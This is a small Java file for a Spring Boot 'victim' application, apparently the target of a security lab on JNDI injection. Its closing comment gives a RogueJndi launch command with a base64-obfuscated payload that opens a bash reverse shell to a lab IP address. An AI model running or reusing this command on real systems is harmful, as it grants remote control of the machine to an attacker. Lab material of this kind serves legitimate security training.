package lab.victim;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class VulnerableApplication {

    public static void main(String[] args) {
        SpringApplication.run(VulnerableApplication.class, args);
    }

}

// java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNS4yLzQ0MyAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "192.168.5.2" --httpPort 8888
